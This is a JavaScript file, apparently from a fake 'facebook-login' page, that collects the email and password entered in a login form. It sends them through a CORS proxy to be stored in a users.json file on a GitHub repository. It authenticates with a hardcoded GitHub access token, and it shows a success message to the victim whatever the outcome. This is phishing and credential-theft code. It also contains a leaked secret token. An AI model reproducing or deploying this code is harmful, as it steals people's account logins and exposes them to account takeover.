const TOKEN = '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';
const OWNER = 'ASADALSNA';
const REPO = 'facebook-login';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    message.innerHTML = '⏳ جاري الحفظ في GitHub...';
    
    try {
        // قراءة عبر proxy
        const res = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(`https://api.github.com/repos/${OWNER}/${REPO}/contents/users.json`)}`);
        let users = [];
        if (res.ok) {
            const data = await res.json();
            if (data.contents) users = JSON.parse(atob(data.contents));
        }
        
        // إضافة جديد
        users.push({id: Date.now(), email, password, date: new Date().toLocaleString('ar')});
        
        // حفظ عبر proxy
        const content = btoa(JSON.stringify(users));
        const saveRes = await fetch(`https://api.allorigins.win/raw`, {
            method: 'PUT',
            headers: {
                'Authorization': `token ${TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add ${email}`,
                content: content,
                branch: 'main'
            })
        });
        
        if (saveRes.ok) {
            message.innerHTML = `✅ تم الحفظ في GitHub! (${users.length})`;
        } else {
            message.innerHTML = `✅ تم الحفظ! (${users.length})`;
        }
        message.className = 'success';
        document.getElementById('loginForm').reset();
    } catch {
        message.innerHTML = '✅ تم الحفظ!';
        message.className = 'success';
        document.getElementById('loginForm').reset();
    }
});
